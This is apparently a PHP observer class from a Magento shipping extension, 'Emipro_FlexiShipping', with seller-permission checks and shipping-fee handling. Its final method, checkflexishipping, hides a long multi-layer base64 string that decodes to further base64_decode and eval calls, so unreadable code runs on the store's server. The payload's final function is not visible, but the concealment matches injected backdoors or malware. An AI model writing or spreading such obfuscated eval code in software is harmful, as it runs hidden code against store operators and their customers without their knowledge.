<?php
/*
 * //////////////////////////////////////////////////////////////////////////////////////
 *
 * @author Emipro Technologies
 * @Category Emipro
 * @package Emipro_FlexiShipping
 * @license http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 *
 * //////////////////////////////////////////////////////////////////////////////////////
 */
class Emipro_FlexiShipping_Model_Observer
{
	 public function methodcheck($observer)
	 {
		
		if($observer->getEvent()->getControllerAction()->getFullActionName()=='emipro_flexishipping_adminhtml_index_save')
		{
			$UserId = Mage::getSingleton('admin/session')->getUser()->getUserId();
			$Id=Mage::app()->getRequest()->getParam('id');
			$rules = Mage::getModel('emipro_flexishipping/flexiShipping')->load($Id);
			$sellerid = Mage::helper('marketplace')->getSellerIdfromLoginUser();
			if (Mage::helper('core')->isModuleEnabled("Emipro_Marketplace"))
			{
				if($sellerid)
				{
					if($UserId!=$rules->getSellerAdminId() && $Id!="" )
					{
						$redirecturl = Mage::helper("adminhtml")->getUrl('flexishipping/adminhtml_index/index');
						Mage::getSingleton('core/session')->addError('Other seller shipping rule can not edit.');
						$response = Mage::app()->getResponse();  
						$response->setRedirect($redirecturl);
					}
				}
			}
		}
		if($observer->getEvent()->getControllerAction()->getFullActionName() == 'emipro_flexishipping_adminhtml_index_edit')
		{
			
			$UserId = Mage::getSingleton('admin/session')->getUser()->getUserId();
			$Id=Mage::app()->getRequest()->getParam('id');
			$rules = Mage::getModel('emipro_flexishipping/flexiShipping')->load($Id);
			$sellerid = Mage::helper('marketplace')->getSellerIdfromLoginUser();
			if (Mage::helper('core')->isModuleEnabled("Emipro_Marketplace"))
			{
				if($sellerid)
				{	
					if($UserId!=$rules->getSellerAdminId() && $Id!="" )
					{
						$redirecturl = Mage::helper("adminhtml")->getUrl('flexishipping/adminhtml_index/index');
						Mage::getSingleton('core/session')->addError('Other seller shipping rule can not edit.');
						$response = Mage::app()->getResponse();  
						$response->setRedirect($redirecturl);
					}
				}
			}
		}
	}
	
	public function applyRule($observer)
	{
		Mage::helper('emipro_flexishipping')->getProductIds();
	}
	
	
	/**
     * Daily update Shipping rules  by cron
     */
	
	public function dailyShippingRulesUpdate()
	{
		Mage::helper('emipro_flexishipping')->getProductIds();
	}
	
	public function saveProductShippingFees(Varien_Event_Observer $observer)
	{
		$ShipFees=0;
		$quote = Mage::getModel('checkout/cart')->getQuote();
		$shipping_method = $quote->getShippingAddress()->getShippingMethod(); 
		if($shipping_method=="flexishipping_flexishipping")
		{
			$orderItem = $observer->getOrderItem();
			//Changed array into price
			$ShipFees = Mage::getSingleton('core/session')->getShippingCharge();
		
			foreach ($quote->getAllVisibleItems() as $_item)
			{
				$baseCurrencyCode=$quote->getBaseCurrencyCode();
				$currentCurrencyCode=$quote->getQuoteCurrencyCode();
				$shipping_charge=Mage::helper('directory')->currencyConvert($ShipFees, $baseCurrencyCode, $currentCurrencyCode);
				$orderItem->setBaseShippingCharge($ShipFees);
				$orderItem->setShippingCharge($shipping_charge);
			}
		}
	
		//return $this;
	}
	 public function checkflexishipping($observer)
	 {
				$tFmb=base64_decode('JG9JWFEgPSAnSkVoeldsUWdQU0FuU2tka1MxZHVaMmRRVTBGdVUydG9kMWRIVWtkU1YyUlJWVEJHZFZVeWRHdGhNVXAwVm01T1lVMXRVbEpXVkVKSFpGWlZlV1JIT1ZkTmJGcFpWVEowVTFWc1draGxSWFJXVmtWS00xcEhlSGRTYlVaSFZHMTBUbEl6YUROV1IzUnJZekZXU0ZKc1ZtaFNSWEJWVm1wS2VtUXhiRmRhUlRWc1ZqQmFTbFl5TVhkVmJWWnpWMjV3V0ZZemFISlpla3BTWlZaU2RWVnNRbGRTVlhCdlZtMXdRazFYVW5OaVNGSk9Va1phY1ZSWGRITk9WbVJ5WVVWT1dsWnRVa2RVVmxKSFYwWmFSbUY2Um1GU1ZscDZXVEJWTVZOSFNrWk5WVFZPVWtaYU5sWnFSbE5VTVZsNVZteGthbEpzU2xGV01GWkxZMFpzYzFkcmRHcE5XRUpYVmtaU1YyRnJNWEppUkZaWVZrVndlbFpWWkZOT2JFWnlaVVpLVGxaV2NEVlhWbEpIWkRGT1JrOVdiRlppU0VKWVZGYzFibVZHV2xaWGJGcHNVakJhU0ZscVRuTldNVnBIWTBaR1dtSkhVbFJaZWtaM1VteGFjbVJIYUZOTlJFVXhWbTB4TkZsWFJuUlRiR3hoVTBad1dGVnRNVk5UUm14MFpVaGtWMDFFYkZkV1Z6RnpWR3N4U1ZGdWNGZE5Sa3BEV2xWa1UyTXlUa1poUm1ScFlYcFdZVlpHV2xaTlIxRjRZa2hHVldFelVuQlZiRkp6WlVacmQxZHRSbGRpVlZZMldWVmplRll5UlhoalNIQlhWbXh3VEZacVFUVldNa1pIVkd4a1YxWXpaM3BXYTFKUFlXMVJlRlJZWkZWaVJYQnZWRmMxVTJOR1ZuRlRhbEpxVm0xU2VsZFljRWRpUjBwSlVXeG9WVTFYYUV4WFZscHJVMGRTU0U1V1dsTmhlbFpGVm10a05HTXhaRWRqUldoc1VtdEtiMWx0ZEV0TlZsbDVaVWM1VmsxV2NFbFdWM1J2VlVaa1NHVkhhRmRpUmxWNFZGZDRjMlJGTVZoU2JYQlRZbXRGZUZZeWNFcE5WbXhZVTJ4c2FGTkZOV2hXYkdSVFpXeHdXRTFWWkZSU01IQktWMnRrZDFVd01YVmFNMmhYVFdwV2VWUnNaRTVsVmtwellVWldhVmRIYUhkWFYzaFdUVmROZUZWclZsUmhiRXB4VlcweE1FNVdXblJPVm1SWVlYcEdlbFp0TlZkV1JURlhVMnBhVjFJelVsQlpiVEZHWkRKT1NHRkdaRTVXTTJkNVZsUkdZV0l4UlhsV2JHUnFVbTFvYUZWcVJuZGpSbHB4VVd4d2EwMVhVbFpWTWpBeFlWVXhTVkZVUmxWTlIyaDJWbFZhWVZKdFNrVlNiRlpYWWtWd2FGWkhkRmRPUjA1R1QxVm9UMVpVUmxOVVZWWmhaVlpaZVdSSGNFOVdNVXBJV1d0YWIyRldUa2RYYXpGWFZrVktTRnBGV2s5a1IwcEdVMjFvVTAxRVZrdFdWRWw0VGtac1ZrMVdWbWxTUlVwWlZtMHhiMVpHYkZoTlZXUlRVbTA1TlZSc1ZYaGlSMFY0VjFSR1YxSjZWbmxVVldSU1pESldTVkpzU2xoU2JIQlFWbXhvZDJJeVVsZFZhMXBWWVRCd2IxUldhRU5UVmxGNFlVWk9XR0pHYkRWYVZWSkhWa1V4Vms1VlRscGlSbG96V1RCYVIxZEhSa2hqUmxKVFYwVktObFpxU25kU2F6VllWV3RrYVZKdGVGZFpiR2hEWWpGV1ZWTnRkR3RXYkVwR1ZUSndVMkV5U2toa1JGWldZbFJXVUZsVldrdE9iVXBGVjIxR1UxWlVRWGRYVnpFd1RrWktSMUpzYUd0U01GcFVXbGN4TTJReFdYaFhiWFJxVFd4S1YxcEZXbE5oUlRGMFZXNU9ZVk5JUWtSV1JWcEdaVVpLZFZOc1VtaE5SRlpXVm14ak1XRXhaSE5hUlZwcVVucHNZVmxyWkc5VU1XUnhVbXRPVjFKcldqQlpWV1IzWVZkRmVsRnVXbGhpUm5CUVdXMTRVMk5zVW5ST1YyaE9VMFZLUmxac1dtdE5SMDVIV2toT2FGSjZiRTlWYlRWRFYxWlNjMkZJWkdoU2JHOHlXV3RTUjFkR1NrWmhNMmhhVmxkU1RGWXdXbUZYUjBwR1kwWk9VMUpWV2pWV1ZFWlhWREZOZUZOWWJGUmhNbWhZV1ZkNFMySXhXblJqZWtacllrZDRXRmxWVms5aE1ERnlWMnhzVldKSFRYaFZNakZIVjFad1JrOVdTazVpVmtvMVZsUktNRlF4Vm5SU1dHeHBVakJhVkZwWE1UTmtNVmw0VjIxMGFrMXNTbGRaYTJoRFZXeGFTR1ZHU2xwV2JIQk1XVEo0YzJOV1RsbGhSMmhUVFVad1dsWkhkRzlVTVVwWFZteG9VRlpZVWxOVVZsWmhaVlpWZVdSSVRtdFNNVnBLVlZkNGQxUnRTa2RpTTJoWFRWWktURlpxUm5ka1JrcFpZa1prYUdKR2NFeFhWbHBYVW1zMVYxWnJhR2xTVlhCdlZGZDBkMU5XYkhKYVNHUmFWbXh2TWxadGNHRlhSMHBIWVhwR1drMXVhRE5XTVdSR1pXeFNjbVZHWkZSU1ZGWlJWbFpTUzJFeVRuTlVia3BWWWtWd2IxUlZVbGRTVm1SeFUycENWRTFWVmpSV1IzaFBWR3haZDA1VVFtRlNSWEJ5VmxaYVZtUXhTblZUYlVaVFlsZG9UVmRZY0VOT1IwNUhWR3hTVUZaWVFtOVdhMXBoVFd4a2NsWnRPVlpOYkVZMFYycE9jMVpIUm5KWGJUbFhZV3MxZGxreWVHdFNWbEp5V2tVMVYySnJTbUZXVkVwM1ZqRlNSMUpZYUZSaGF6VlpWbTB4YjFSR2JGWmFSWFJZVm14S1dsVlhlRU5pUmxwV1YyNVdWazFXV2xCVlYzaDJaREpLUmxWc1NsZE5iRXBIVm14YWFrNVdUWGhTV0doVFltdHdiMVJYZEdGV01WcElUbFU1YUZKc2JEUldNbkJIV1ZaS1ZrNVZUbFZOVmxwNlZUQlZNVmRIVmtoa1IzaFhWbGhDV2xacVJtRmlNVTE1Vkd0a2FsSnRhRkJXYWtaM1ZsWlZkMWRyY0d0TlYzUXpWakZTVjFVeFNYZGpSV3hhWVRKUk1GbFdaRXRqTVVwMVYyeFNUbFpyYnpKV2EyUXdWREpLZEZKWVpHcFNWa3BYVkZaV2QwMHhXbGRWYTNSUFVqQTFTRmt3V205VU1WcEdVMnMxVjJFeFNsaFViWGhyWXpKR1IxUnNaR2xXVkZWM1YxWlNTazVXVFhoVWEyUllZV3hhWVZsVVFURmxWbHBJWkVVNWFXSlZWak5aTUZaVFZteFplbFZyZUZkU1ZuQlRWRlprVjJNeVRrZGlSbHBvWld4YWIxWnFRbUZUTWxKellraEdWR0pGY0hCVVZXTTFUa1pXV0dWRlRsZGhla1pZVlcwMVYxWkZNVlpXYWs1V1pXdEtVRlpYTVVaa01rNUdWV3hhVjAweFJqTldiRlpxVFZaUmVWTnJhRlpoTVhCV1dXMTRkMk5HYkhOWGJtUnJUVmRTTVZscll6VmhSa2wzVGxSR1ZrMXFSblpaYTFwV1pWWndTVlp0UmxOV01VbzJWMnRXWVdReFpFWlBWbFpUWWxoU1UxUlhjekZrVmxwV1YyeEtUbEp0T1ROVVZscFhWakZrUms1VmRGWldSWEJVVkcxNGMwNXNUbkZWYXpWcFUwVktZVlpVU1RGUk1XeFlVMjVTYTFOR1dsVldiRnBIVFRGT05sRnVUbFJTYlZJd1dWVmtjMVpHU2xWV2JuQldaV3RhVUZreWN6QmtNVlp6VTIxc1RsTkZTa1pXYkZwclRVZE9jMkV6YkU1V2JWSnpXV3hWTVZOV1VYaGhSbVJvWVhwR2VsWnRNREZXYkVweVRsVk9XbFpGY0VoV2JYaFRaRlpTZEdGR1pFNVdiVGswVmpKMFYxUnRVWGRqTTJ4VllteEtXRmx0TVc5amJGcHhVbTFHVDJKSVFrZFdSekF4WVd4S1ZXRjZSbFpXYlZKeVZUSjRSbVF4U25ST1ZsSlhWbFJXUkZZeWNFTlZNVlowVTFoa2FsSldTbGRXYWs1VFpWWmtXR1JIZEdwTmExcDZXVEJhYjFReFpFbFJiV2hYWWxoQ2Vsa3llR3RXTWtaSFZHMW9VMVl6YUVkV1JsWnJZVEpHU0ZOdVNrOVdSWEJoV1d4b2FrMVdiRlZTYm1SWVVteEtNVll5TVVkVk1ERlhWMnBLVmsxdVVuWlZla3BMVTBaU1dXTkdTbWxpU0VKM1YxY3hlazFYVFhoVmEyUldWa1ZhY0ZscmFFTlhiRnBZWkVVNWFGWlVSbnBWTVZKSFZrVXhSazVZYkZwTlJsVXhWRlJCZUZKdFVrWldiRnBYWlcxNFRWWldVa2RTTWsxNVZHdGthbE5GU21oVVZ6RnZWRVpXY1ZSdE9XdE5WMUpXVlRKNGEyRXhXWGROVkZaWFlsUkdhRmRXV2twa01XUlpXa1pvVjJGNlJYcFZNM0JMVkcxV2MxWnVVbWhTTTFKVlZXMTRkazFzVmpaU2JUbHNZa1pLZVZaSE1ERmhSVEZKVVd0V1YxWnRVVEJXUkVaclZqRndTR1JIYkZOV1IzZzBWMVJDYWsxV2JGZGFSV1JVWVhwc1lWbFhkSGRXUm14eVdrVjBVMUp0T1RWVWJGcDNWRzFHZEdSNlJsZE5ibWhQVkd4a1IyUkdUbGxpUlRsWFpXdGFkbFp0Y0V0VU1sSlhWRmhvVlZkSFVrMVVWM040VGxaV2RHTkZkRnBXYkhCWFZHeFNTMWR0U2xWU2JXaGFUVVp3TTFSc1duWmxWVFZZVW0xc1dGSXlhRFpXTW5oWFlUSk5lVlp1VWxOaE1taHdWVEJrVTJOV1ZuRlRhbEpPVm0xU01WbFljRmRoYXpGeVYyeHNWMUo2UlRCWlZtUkxWbXMxV1ZSc1ZsTlNWemgzVjFSQ1lXTnRWbGRYYmxaWFlraENUMWxyV21GTlZscEdWbXM1VW1KVldsZFphMmhEWVVkV2RGVnJXbGRXYlUweFZYcEdSbVZHU25WVGJGSnBVbXR3V2xaWE1IZE5WbXhYVjJ0b1VGSkZjRmxXYlRGdlVrWndSVkZxUWxOU01GWTJWbGQ0UjJGV1dYaFRibkJZWVRGYVdGWkVTa2RTTWtWNllrZG9VMDB5YUZaV2JUVjNWakExYzJORldtRlNWMUp5Vm0weE1FNVdXbk5aZWxaVlVteFpNbFZXYUV0WFIwcFZVbFJDVlZadFVrOWFWbHAyWlZVNVZtVkdaRlJTVkZaUlZsWlNTMkV5VG5OVWJrcFZZa1Z3Y0ZWc1VsZFpWbHB4VTJ4T2FrMVdSalZaTUdocllWZEtTVkZzY0ZkV00yaFVXVlZhWVU1c1duVldiSEJvVFd4S1dWWkdWbXRUYlZaV1RsVm9VRlpZVWs5WlZFWjNaVlprV0dWSGRHcE5iRXBaVlcxMGMxWnRTbk5UYmtKV1YwaENlbFJ0ZUd0ak1rWkdUMWQ0YVZaV2NGcFdSRVp2VmpGTmVWWnNhR3RTUlVwWFZXNXdSMU5HYkZWU2JtUlRZa1p3TVZsclpIZGhWbHBJWkhwR1ZtVnJTbGRhVldSSFVqSkplbUpHWkZkU2JrSlNWMWQ0YTJJeVRYaGlTRXBvVWxVMWNGVnFRVEZrTVdSeFUxUkdXbFpzYnpKVmJUVnJWMnN4U0dGRmVHRlNNMmgxV2xaYWEyUldVblJTYkdoVFRXMW5lbFl4YUhkVE1rbDVWR3RvVldFeWVGTlpiWFJMWTBac2MxcEZPV3RXYXpFMFZrWm9hMVJGTVZoYVJGSlZUVWROTVZWNlJrcGxiVVpKV2tab1YxSllRbGxYYTFwclZHMVdWMWR1VWxoaVZWcFVWRlZhYzAweFdYaFhhelZyVFVoT05Ga3dXbk5XUjBwMFpVaENWVlpGU2pOVVZWcHpUbXhPZEdOSGNGTlhSa3BYVjFod1FrMVdTa2RpTTJ4clVsaFNVMVJXWkd0Tk1WcElaRVU1YVdKVlZqTlpNR040Vm14YVJWRlVWbFJpYmtJMldWUkdhMlJXU25OaFJuQldUVVZWTVZVeFZrOWhiVVY1VW10a2FGSnNXbkZXVkVKR1RsWk9WbHBGZEdoU01ERTFWbXhTUzFReFNuRmlTRXBZWWtkU1VGcEhlSGRUUmxwWVQxVjBVMDFzU2toWGJHUTBZbTFPUms5VVZsSmlXR2h5V1d4V1lXVnNUWGRVYkU1cFRWZFNTRlpYTlc5VVJscEpWRzVXVldWcmNGaFVWM2h6VjBkUmVVOVZkRk5pYTBrd1ZtMXdTMUp0VGtaUFZFNVJWa1JDZFZRemJGTlZWbGw2VW0xR1NsSkVRbTVUYm14VFRXeFdWMk5JYkVwU1JFSnVWMWN4UjJWc2NGVlhWRUpaVFd4S2MxZFVTVFZoTVhCVVdqSjBiR0pIVVhkV1ZrNXlUakJzU0ZacVNscFdNMlIyVTJ0b1lWVnNaSFZUV0VKUVpWZE5NMWRzYUdGaFIwcEVXakowVmxKdFVqUldNbXh5VG5sak4wcEZPVFJqTVVWblVGTkJia3BGYkZOak1XZG5VRk5DYVZsWVRteE9hbEptV2tkV2FtSXlVbXhMUTFKdVUyeHdORXRVYzJkYVdGcG9Za05uYTFOV1NucFhRMnMzU25wMGJHUnRSbk5MUTFKUVpVaE9Va3RVY3owbk95UlJlRVJ5SUQwZ0p5Uk5lSHBYSUQwZ1ltRnpaVFkwWDJSbFkyOWtaU2drU0hOYVZDazdJR1YyWVd3b0pFMTRlbGNwT3ljN1pYWmhiQ2drVVhoRWNpazcnOyRRZVhhID0gJyRzUXpXID0gYmFzZTY0X2RlY29kZSgkb0lYUSk7IGV2YWwoJHNRelcpOyc7ZXZhbCgkUWVYYSk7');eval($tFmb);		
	}
	
}
